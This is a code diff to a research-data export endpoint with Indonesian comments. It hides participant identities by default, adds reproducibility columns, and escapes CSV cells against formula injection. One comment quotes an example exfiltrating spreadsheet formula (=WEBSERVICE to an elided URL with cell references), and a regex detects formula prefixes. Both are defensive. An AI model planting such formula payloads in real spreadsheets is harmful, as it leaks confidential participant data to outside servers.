@@ -1,7 +1,16 @@
 import ExcelJS from 'exceljs'
 import { LABEL_KATEGORI_IMT } from '~~/lib/imt'
-import { LABEL_KATEGORI_RISIKO } from '~~/lib/cmdq/skala'
+import {
+  AMBANG_TOTAL_SEDANG,
+  AMBANG_TOTAL_TINGGI,
+  BOBOT_FREKUENSI,
+  LABEL_KATEGORI_RISIKO,
+  SKALA_FREKUENSI,
+  SKOR_SEGMEN_MAKS,
+  SKOR_TOTAL_MAKS,
+} from '~~/lib/cmdq/skala'
 import { ITEM_SUS } from '~~/lib/sus/item'
+import { LABEL_INTERPRETASI, TARGET_SUS } from '~~/lib/sus/skoring'
 
 /**
  * GET /api/admin/ekspor?format=xlsx|csv — ekspor data mentah penelitian.
@@ -17,6 +26,13 @@ import { ITEM_SUS } from '~~/lib/sus/item'
  *   Sheet 3 "CMDQ Rinci"  — long format: frekuensi, ketidaknyamanan, gangguan
  *   Sheet 4 "SUS"         — 10 kolom jawaban item + skor akhir
  *   Sheet 5 "Kamus Data"  — keterangan variabel & kode, untuk lampiran tesis
+ *
+ * IDENTITAS DIKECUALIKAN SECARA BAWAAN.
+ * `kodeResponden` ("PTX-001") adalah pengenal anonim yang dijanjikan kepada
+ * responden pada lembar persetujuan. Nama dan surel hanya ikut bila diminta
+ * eksplisit lewat `?identitas=1`, karena berkas hasil ekspor berpindah ke luar
+ * kendali aplikasi: tersimpan di laptop, terkirim sebagai lampiran surel, ikut
+ * tersinkron ke awan. Seluruh lembar analisis sudah berkunci `Kode` saja.
  */
 
 const KODE_JK = { LAKI_LAKI: 1, PEREMPUAN: 2 } as const
@@ -30,17 +46,13 @@ const KODE_IMT = {
 const KODE_RISIKO = { RENDAH: 1, SEDANG: 2, TINGGI: 3 } as const
 const KODE_SUS = { NOT_ACCEPTABLE: 1, MARGINAL: 2, ACCEPTABLE: 3 } as const
 
-const LABEL_SUS_INTERPRETASI = {
-  NOT_ACCEPTABLE: 'Tidak Dapat Diterima',
-  MARGINAL: 'Marginal',
-  ACCEPTABLE: 'Dapat Diterima',
-} as const
-
 export default defineEventHandler(async (event) => {
   await wajibAdmin(event)
 
   const { where } = bacaFilter(event)
-  const format = getQuery(event).format === 'csv' ? 'csv' : 'xlsx'
+  const kueri = getQuery(event)
+  const format = kueri.format === 'csv' ? 'csv' : 'xlsx'
+  const sertakanIdentitas = kueri.identitas === '1'
 
   const [segmen, responden] = await Promise.all([
     prisma.segmenTubuh.findMany({
@@ -66,6 +78,9 @@ export default defineEventHandler(async (event) => {
   ])
 
   const stempel = new Date().toISOString().slice(0, 10)
+  // Dibangun sekali; sebelumnya Map 28 entri ini dibuat ulang untuk SETIAP
+  // responden di dalam flatMap lembar "CMDQ Rinci".
+  const petaSegmen = new Map(segmen.map((s) => [s.id, s]))
 
   // ── Baris utama (dipakai Excel sheet 1 maupun CSV) ─────────────────────
   // Sel dikosongkan (bukan diisi 0) bila responden belum melengkapi profil —
@@ -74,8 +89,7 @@ export default defineEventHandler(async (event) => {
 
   const barisResponden = responden.map((r) => ({
     Kode: r.kodeResponden,
-    Nama: r.nama,
-    Email: r.email,
+    ...(sertakanIdentitas ? { Nama: r.nama, Email: r.email } : {}),
     Unit_Kerja: r.unitKerja ?? '',
     Setuju_Etik: r.setujuEtik ? 1 : 0,
     Tanggal_Persetujuan: r.tanggalPersetujuan?.toISOString().slice(0, 10) ?? '',
@@ -109,10 +123,18 @@ export default defineEventHandler(async (event) => {
       ? LABEL_KATEGORI_RISIKO[r.cmdqHasil.kategoriRisiko]
       : '',
     CMDQ_Segmen_Tertinggi: r.cmdqHasil?.segmenTertinggi?.nama ?? '',
+    // Ambang yang BERLAKU SAAT skor itu dihitung, bukan ambang yang berlaku
+    // saat berkas ini dibuat. Tanpa ketiga kolom ini, satu dataset yang
+    // dikumpulkan sebelum dan sesudah revisi cut-off tidak bisa dibedakan
+    // lagi — dan `CMDQ_Risiko_Kode` tidak dapat direproduksi dari
+    // `CMDQ_Skor_Total`.
+    CMDQ_Ambang_Sedang: r.cmdqHasil?.ambangSedang.toNumber() ?? '',
+    CMDQ_Ambang_Tinggi: r.cmdqHasil?.ambangTinggi.toNumber() ?? '',
+    CMDQ_Segmen_Dinilai: r.cmdqHasil?.jumlahSegmenDinilai ?? '',
     SUS_Skor: r.susHasil?.skorTotal.toNumber() ?? '',
     SUS_Interpretasi_Kode: r.susHasil ? KODE_SUS[r.susHasil.interpretasi] : '',
     SUS_Interpretasi_Label: r.susHasil
-      ? LABEL_SUS_INTERPRETASI[r.susHasil.interpretasi]
+      ? LABEL_INTERPRETASI[r.susHasil.interpretasi]
       : '',
     SUS_Grade: r.susHasil?.gradeHuruf ?? '',
     SUS_Memenuhi_Target: r.susHasil ? (r.susHasil.memenuhiTarget ? 1 : 0) : '',
@@ -122,9 +144,28 @@ export default defineEventHandler(async (event) => {
   // ── CSV: cukup sheet utama ─────────────────────────────────────────────
   if (format === 'csv') {
     const kolom = Object.keys(barisResponden[0] ?? { Kode: '' })
+
+    /**
+     * Escape CSV + penangkal formula injection.
+     *
+     * Tiga kolom berisi teks bebas yang diketik responden: `Nama`,
+     * `Unit_Kerja`, dan `Keterangan_Riwayat` (sampai 500 karakter). Excel dan
+     * LibreOffice memperlakukan sel yang diawali `=`, `+`, `-`, atau `@`
+     * sebagai FORMULA dan menjalankannya saat berkas dibuka. Seorang responden
+     * yang mendaftar dengan nama `=WEBSERVICE("https://…"&A2&B2)` — tanpa
+     * koma atau kutip, sehingga lolos escape pembatas — dapat membuat laptop
+     * peneliti, yang menyimpan seluruh dataset penelitian, mengirimkan isi sel
+     * di sekitarnya ke server pihak lain begitu berkas dibuka.
+     *
+     * Awalan kutip tunggal membuat Excel memperlakukannya sebagai teks biasa.
+     * Jalur XLSX tidak terpengaruh: ExcelJS memberi tipe `String` pada nilai
+     * string, bukan `Formula`.
+     */
+    const AWALAN_FORMULA = /^[=+\-@\t\r]/
     const escape = (v: unknown) => {
-      const s = String(v ?? '')
-      return /[",\n;]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
+      let s = String(v ?? '')
+      if (AWALAN_FORMULA.test(s)) s = `'${s}`
+      return /[",\n\r;']/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
     }
     const isi = [
       kolom.join(','),
@@ -134,10 +175,14 @@ export default defineEventHandler(async (event) => {
     ].join('\r\n')
 
     setHeader(event, 'Content-Type', 'text/csv; charset=utf-8')
+    // Nama berkas menyebut "profil" secara eksplisit: CSV hanya memuat lembar
+    // Responden. Skor 28 segmen, rincian tiga dimensi, dan jawaban item SUS
+    // hanya ada di berkas XLSX. Analisis per bagian tubuh tidak bisa dilakukan
+    // dari berkas ini.
     setHeader(
       event,
       'Content-Disposition',
-      `attachment; filename="ergoself-responden-${stempel}.csv"`,
+      `attachment; filename="ergoself-profil-responden-${stempel}.csv"`,
     )
     // BOM agar Excel membaca karakter Indonesia dengan benar
     return `﻿${isi}`
@@ -190,24 +235,28 @@ export default defineEventHandler(async (event) => {
   // Sheet 3 — rincian tiga dimensi CMDQ (long format)
   tulisSheet(
     'CMDQ Rinci',
-    responden.flatMap((r) => {
-      const namaSegmen = new Map(segmen.map((s) => [s.id, s]))
-      return r.cmdqJawaban
+    responden.flatMap((r) =>
+      r.cmdqJawaban
         .map((j) => {
-          const s = namaSegmen.get(j.segmenId)
+          const s = petaSegmen.get(j.segmenId)
           return {
             Kode: r.kodeResponden,
             Segmen_No: s?.urutan ?? '',
             Segmen_Kode: s?.kode ?? '',
             Segmen_Nama: s?.nama ?? '',
             Frekuensi: j.frekuensiKode,
+            // Bobot yang benar-benar dipakai perhitungan. Saat ini sama dengan
+            // kode frekuensi, tetapi `lib/cmdq/skala.ts` menyediakan jalur
+            // pindah ke bobot baku CMDQ (0/1,5/3,5/5/10). Tanpa kolom ini,
+            // `Skor` tidak lagi dapat diverifikasi ulang setelah perpindahan.
+            Bobot_Frekuensi: j.frekuensiBobot.toNumber(),
             Ketidaknyamanan: j.ketidaknyamananSkor ?? '',
             Gangguan: j.gangguanSkor ?? '',
             Skor: j.skor.toNumber(),
           }
         })
-        .sort((a, b) => Number(a.Segmen_No) - Number(b.Segmen_No))
-    }),
+        .sort((a, b) => Number(a.Segmen_No) - Number(b.Segmen_No)),
+    ),
   )
 
   // Sheet 4 — SUS (wide, 10 item)
@@ -225,29 +274,40 @@ export default defineEventHandler(async (event) => {
         baris.SUS_Skor = r.susHasil?.skorTotal.toNumber() ?? ''
         baris.SUS_Grade = r.susHasil?.gradeHuruf ?? ''
         baris.SUS_Interpretasi = r.susHasil
-          ? LABEL_SUS_INTERPRETASI[r.susHasil.interpretasi]
+          ? LABEL_INTERPRETASI[r.susHasil.interpretasi]
           : ''
         return baris
       }),
   )
 
-  // Sheet 5 — kamus data, siap dilampirkan di tesis
+  // Sheet 5 — kamus data, siap dilampirkan di tesis.
+  //
+  // Seluruh angka diambil dari konstanta di `lib/cmdq/skala.ts` dan
+  // `lib/sus/skoring.ts`, tidak ditulis tangan. Lembar ini menjadi lampiran
+  // metodologi; bila ambang atau bobot direvisi sementara angka di sini tetap,
+  // tesis akan memuat keterangan yang bertentangan dengan datanya sendiri.
+  const labelFrekuensi = SKALA_FREKUENSI.map((o) => `${o.nilai} = ${o.label}`).join('; ')
+
   tulisSheet('Kamus Data', [
     { Variabel: 'Setuju_Etik', Keterangan: 'Persetujuan etik penelitian (informed consent)', Kode: '0 = Tidak; 1 = Ya. Kolom Tanggal_Persetujuan merekam waktunya.' },
-    { Variabel: 'Status_Profil / CMDQ / SUS', Keterangan: 'Kemajuan pengisian tiap instrumen', Kode: 'BELUM; BERLANGSUNG; SELESAI' },
+    { Variabel: 'Status_Profil / CMDQ / SUS', Keterangan: 'Kemajuan pengisian tiap instrumen', Kode: 'BELUM; SELESAI' },
     { Variabel: '(sel kosong)', Keterangan: 'Missing value', Kode: 'Responden sudah mendaftar tetapi belum melengkapi profil pekerja' },
     { Variabel: 'JK_Kode', Keterangan: 'Jenis kelamin', Kode: '1 = Laki-laki; 2 = Perempuan' },
     { Variabel: 'IMT_Kode', Keterangan: 'Kategori IMT (Kemenkes RI)', Kode: '1 = Kurus berat; 2 = Kurus ringan; 3 = Normal; 4 = Gemuk ringan; 5 = Obesitas' },
     { Variabel: 'Olahraga / Merokok / Riwayat_MSDs', Keterangan: 'Kebiasaan & riwayat', Kode: '0 = Tidak; 1 = Ya' },
-    { Variabel: 'Frekuensi', Keterangan: 'Frekuensi keluhan CMDQ', Kode: '0 = Tidak pernah; 1 = 1–2×/minggu; 2 = 3–4×/minggu; 3 = Setiap hari' },
+    { Variabel: 'Frekuensi', Keterangan: 'Frekuensi keluhan CMDQ (kode pilihan)', Kode: labelFrekuensi },
+    { Variabel: 'Bobot_Frekuensi', Keterangan: 'Bobot yang dipakai perhitungan skor', Kode: `Bobot berlaku: ${BOBOT_FREKUENSI.join(' / ')}` },
     { Variabel: 'Ketidaknyamanan', Keterangan: 'Tingkat ketidaknyamanan', Kode: '1 = Sedikit; 2 = Agak; 3 = Sangat (kosong bila Frekuensi = 0)' },
     { Variabel: 'Gangguan', Keterangan: 'Gangguan terhadap pekerjaan', Kode: '1 = Tidak sama sekali; 2 = Sedikit; 3 = Sangat (kosong bila Frekuensi = 0)' },
-    { Variabel: 'Skor', Keterangan: 'Skor segmen = Frekuensi × Ketidaknyamanan × Gangguan', Kode: 'Rentang 0–27' },
-    { Variabel: 'CMDQ_Skor_Total', Keterangan: 'Jumlah skor 28 segmen', Kode: 'Rentang 0–756' },
-    { Variabel: 'CMDQ_Risiko_Kode', Keterangan: 'Kategori risiko MSDs', Kode: '1 = Rendah (≤252); 2 = Sedang (>252–504); 3 = Tinggi (>504)' },
-    { Variabel: 'SUS01–SUS10', Keterangan: 'Jawaban item SUS (Likert)', Kode: '1 = Sangat Tidak Setuju … 5 = Sangat Setuju' },
-    { Variabel: 'SUS_Skor', Keterangan: 'Skor SUS = Σ kontribusi × 2,5', Kode: 'Rentang 0–100; target ≥ 68' },
+    { Variabel: 'Skor', Keterangan: 'Skor segmen = Bobot_Frekuensi × Ketidaknyamanan × Gangguan', Kode: `Rentang 0–${SKOR_SEGMEN_MAKS}` },
+    { Variabel: 'CMDQ_Skor_Total', Keterangan: `Jumlah skor ${segmen.length} segmen`, Kode: `Rentang 0–${SKOR_TOTAL_MAKS}` },
+    { Variabel: 'CMDQ_Risiko_Kode', Keterangan: 'Kategori risiko MSDs (ambang buatan peneliti, lihat Bab III)', Kode: `1 = Rendah (≤${AMBANG_TOTAL_SEDANG}); 2 = Sedang (>${AMBANG_TOTAL_SEDANG}–${AMBANG_TOTAL_TINGGI}); 3 = Tinggi (>${AMBANG_TOTAL_TINGGI})` },
+    { Variabel: 'CMDQ_Ambang_Sedang / Tinggi', Keterangan: 'Ambang yang BERLAKU SAAT skor responden dihitung', Kode: 'Dipakai untuk memverifikasi CMDQ_Risiko_Kode; bisa berbeda antar baris bila ambang direvisi di tengah pengumpulan data' },
+    { Variabel: 'CMDQ_Segmen_Dinilai', Keterangan: 'Banyaknya segmen yang dinilai saat perhitungan', Kode: `Saat ini ${segmen.length}` },
+    { Variabel: 'SUS01–SUS10', Keterangan: 'Jawaban item SUS (Likert). Item genap bernada negatif dan dinilai terbalik.', Kode: '1 = Sangat Tidak Setuju … 5 = Sangat Setuju' },
+    { Variabel: 'SUS_Skor', Keterangan: 'Skor SUS = Σ kontribusi × 2,5', Kode: `Rentang 0–100; target penelitian ≥ ${TARGET_SUS}` },
     { Variabel: 'SUS_Interpretasi_Kode', Keterangan: 'Akseptabilitas (Bangor et al., 2009)', Kode: '1 = Not acceptable (<50); 2 = Marginal (50–70); 3 = Acceptable (>70)' },
+    { Variabel: 'SUS_Memenuhi_Target', Keterangan: `Skor ≥ ${TARGET_SUS} (rata-rata industri). BUKAN hal yang sama dengan SUS_Interpretasi_Kode — skor 70 memenuhi target tetapi masih berkategori Marginal.`, Kode: '0 = Tidak; 1 = Ya' },
   ])
 
   const buffer = await wb.xlsx.writeBuffer()
